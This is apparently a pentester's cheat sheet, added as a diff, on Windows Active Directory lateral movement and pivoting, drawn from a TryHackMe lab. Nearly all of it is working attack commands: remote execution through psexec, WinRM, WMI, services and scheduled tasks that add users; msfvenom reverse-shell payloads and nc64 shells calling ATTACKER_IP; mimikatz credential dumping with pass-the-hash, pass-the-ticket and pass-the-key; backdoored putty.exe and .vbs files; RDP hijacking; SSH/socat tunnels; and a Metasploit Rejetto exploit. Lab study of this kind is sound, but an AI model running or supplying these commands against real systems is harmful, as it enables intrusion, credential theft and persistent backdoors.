@@ -1,0 +1,237 @@
+### lateral movement from an initial access ###
+## links ##
+https://tryhackme.com/room/lateralmovementandpivoting
+
+
+######################
+## remote connexion ##
+######################
+# psexec (445/TCP SMB Administrators)
+psexec64.exe \\MACHINE_IP -u Administrator -p PASS -i cmd.exe				# windows
+psexec.py thm.red/thm@10.10.152.55							# on linux
+
+
+# winRM (5985/TCP 5986/TCP Remote Management users)
+evil-winrm -u USER -p PASS -i 10.200.57.150
+evil-winrm -u USER -H HASH -i 10.200.57.150
+evil-winrm -u USER -p PASS -i IP -s /path/to/powershell-script
+winrs.exe -u:Administrator -p:Mypass123 -r:target cmd					# windows
+
+
+####################
+## WMI powershell ##
+####################
+# DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP
+# Wsman: WinRM will be used. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+# store creds varaible
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+Enter-PSSession -Computername TARGET -Credential $credential				# interactive session 
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}	# run command
+
+# sc (135/445/139 Administrators)
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto	# remote create service
+sc.exe \\TARGET start THMservice							# start service
+sc.exe \\TARGET stop THMservice								# stop service
+sc.exe \\TARGET delete THMservice							# remove service
+
+# remote scheduled tasks
+schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "whoami" /sc ONCE /sd 01/01/1970 /st 00:00
+schtasks /s TARGET /run /TN "THMtask1"                                                  # run task
+schtasks /S TARGET /TN "THMtask1" /DELETE /F                                            # remove task
+
+
+#############
+## example ##
+#############
+# new reverse shell for service
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.14.32.190 LPORT=4444 -o myservice.exe
+# use found admin creds to upload rshell in ADMIN$ share
+smbclient -c 'put myservice.exe' -U USER -W ZA '//thmiis.za.tryhackme.com/admin$/' PASS
+# setup msf
+msfconsole -q -x "use multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.14.32.190; set LPORT 4444;exploit"
+# from pwn, get rshell with admin on pwned machine
+PWN> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.14.32.190 4443" 
+# now exec rshell to get access to the new pwned machine
+sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
+sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
+
+
+####################
+## WMI powershell ##
+####################
+# DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP
+# Wsman: WinRM will be used. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+# store creds varaible
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+## Remote Process Creation Using WMI ##
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+# OR
+wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
+
+## Creating Services Remotely with WMI ##
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "THMService2";
+DisplayName = "THMService2";
+PathName = "net user munra2 Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
+Invoke-CimMethod -InputObject $Service -MethodName StartService			# start service
+Invoke-CimMethod -InputObject $Service -MethodName StopService			# stop service
+Invoke-CimMethod -InputObject $Service -MethodName Delete			# delete service
+
+## Creating Scheduled Tasks Remotely with WMI ##
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"			# start task
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"		# delete task
+
+## Installing MSI packages through WMI ##
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+# OR
+wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+
+
+#############
+## Example ##
+#############
+# create msi package
+ATT> msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > myinstaller.msi
+# put it on the wanted admin share to pivot
+ATT> smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' PASS
+# listening rshell
+ATT> msfconsole
+	> set LHOST lateralmovement
+	> set LPORT 4445
+	> set payload windows/x64/shell_reverse_tcp
+# connect to pwned user (non admin)
+ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
+# start a WMI session with the leaked admin creds
+PS C:\> $username = 't1_corine.waters';
+PS C:\> $password = 'Korine.1994';
+PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
+PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop 
+PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+
+
+####################
+## Alternate AUTH ##
+####################
+## PATH THE HASH ##
+# on pwned machine, get local user HASHES
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam 
+# on pwned machine, get recently logged domain user HASHES
+mimikatz # sekurlsa::msv 
+# PtH attack
+mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe IP 4444"
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH 	# PtH RDP
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP	# PtH psexec
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH		# PtH winrm
+
+## KERBEROS AUTH ##
+# on pwned machine, get stored kerberos tickets
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+# inject the exported ticket to our own session
+mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+> klist							# to check if ticket is correctly injected
+
+## PASS THE KEY ##
+# is there any derived kerberos keys stored ?
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+# on pwn machine, elevate
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444"
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444"
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444"
+# RCA = NTLM hash, if NTLM hash is founded and kerberos allow RC4 => OPtH
+# since creds are already injected we can use this to jump to another machine
+winrs.exe -r:THMIIS.za.tryhackme.com cmd
+
+
+###################
+## USER BEHAVIOR ##
+###################
+# backdoor shortcurt
+# backdooring .vbs > copy nc64.exe and execute it
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe ATTACKER_IP 4444", 0, True
+# backdooring .exe file > download shared putty.exe and add it a silent payload
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+# RDP hijacking (be admin)
+PWN> PsExec64.exe -s cmd.exe
+	> query user					# list existing session
+	> query session					# or session
+	> tscon 3 /dest:rdp-tcp#6			# connect session ID 3 to our RDP ID session
+
+
+#####################
+## PORT FORWARDING ##
+#####################
+## SSH remote port forwarding
+# on windows, usually sshclient but no sshserver. you have to connect back to attacker machine
+# create a user
+ATT> useradd tunneluser -m -d /home/tunneluser -s /bin/true && passwd tunneluser	# add user on attacker machine
+PWN> ssh tunneluser@ATTACKER_IP -R 3389:TARGET_IP:3389 -N				# remote port forwarding
+ATT> xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword					# rdp into it
+
+## SSH local port forwarding
+# allow target to access attacker port trought the pwned machine
+ATT> useradd tunneluser -m -d /home/tunneluser -s /bin/true && passwd tunneluser        # add user on attacker machine
+PWN> ssh tunneluser@ATTACKER_IP -L *:80:127.0.0.1:80 -N					# local port exposed on PWN
+# maybe need to add a firewall rule to allow incoming request on PWN
+PWN> netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+
+## SOCAT port forwarding
+# we have to transfert socat to the pwn machine
+PWN> socat TCP4-LISTEN:3389,fork TCP4:TARGET_IP:3389					# redirect from pwn to target
+# maybe need to add a firewall rule to allow incoming request on PWN
+PWN> netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+# OR
+PWN> socat TCP4-LISTEN:80,fork TCP4:ATTACKER_IP:80					# redirect from pwn to attacker
+
+## SOCAT reverse Dynamic port forwarding
+# on windows, usually sshclient but no sshserver. you have to connect back to attacker machine
+PWN> ssh tunneluser@ATTACKER_IP -R 9050 -N						# all network trought 9050
+ATT> nano /etc/proxychains.conf
+ATT> socks4  127.0.0.1 9050
+ATT> proxychains curl http://pxeboot.za.tryhackme.com					# accessible trought PWN
+
+
+####################################
+## Rejetto exploit full tunneling ##
+####################################
+ATT> useradd tunneluser -m -d /home/tunneluser -s /bin/true && passwd tunneluser        # add user on attacker machine
+PWN> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N
+ATT> msfconsole
+msf6 > use rejetto_hfs_exec
+msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com	# TARGET call PWN
+msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1	# return comes from home
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7777
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
+msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
+
